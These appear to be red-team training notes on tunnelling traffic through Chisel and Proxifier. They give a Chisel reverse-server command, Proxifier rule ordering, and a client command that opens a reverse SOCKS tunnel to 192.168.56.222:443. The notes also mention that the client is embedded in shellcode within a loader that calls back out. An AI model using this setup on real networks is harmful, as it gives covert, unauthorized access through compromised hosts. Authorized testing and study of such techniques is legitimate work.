### **Proxifier Setup with Chisel**

1. **Configure Proxifier:**

   - Go to `Profile > Advanced > Services and other users`.
   - **Check both options** to ensure proper routing through the proxy.

2. **Start Chisel Server:**

   - Run the following command in your terminal:
     ```bash
     .\chisel.exe server -p 443 --reverse
     ```
   - This command starts a Chisel server that listens on port `443` and opens a SOCKS proxy at `127.0.0.1:1080`.

3. **Configure Proxifier to Use Chisel Proxy:**

   - Set the Proxifier server to the Chisel proxy listener address: `127.0.0.1:1080`.


---

### **Proxifier Rule Configuration and Chisel Client Setup**

1. **Localhost Rule:**
   - The **localhost rule** is a "fail-safe" rule.
   - It ensures that all local traffic is correctly routed through `localhost` as intended, preventing accidental routing of local traffic through external proxies.

2. **Rule Order:**
   - When configuring rules in Proxifier:
     - **Tools and Targets:** Place these rules **below the localhost rule** and **above the default rule**.
     - This ensures that specific tools and target rules are applied correctly, after the localhost rule but before any default routing rules.

3. **Direct Action Option:**
   - The **Direct action** option means that the traffic will follow the default route without altering ports.
   - Use this option when you want traffic to connect directly without passing through a proxy.

4. **Selecting a Proxy:**
   - When selecting a proxy in your rules, you're choosing the proxy server that has been configured on your local machine.
   - This proxy will be used to handle the routing of traffic according to the rules you set up.

5. **Target Configuration:**
   - **Target** refers to the specific destination or resource your rules apply to, such as a particular IP address, domain, or application.

6. **Chisel Client Setup:**
   - Run the following command to set up the Chisel client:
     ```bash
     .\chisel.exe client --tls-skip-verify 192.168.56.222:443 R:socks
     ```
   - This command configures the client to connect to the server at `192.168.56.222` over port `443`, establishing a reverse SOCKS proxy.
   - **Note:** The client is embedded in shellcode within a loader, which reaches out over port `443` to establish a reverse SOCKS connection.

7. **Running as a Domain User:**
   - To run this setup in the context of a domain user, use the `runas` command or an equivalent method to execute the tools within the correct user context.
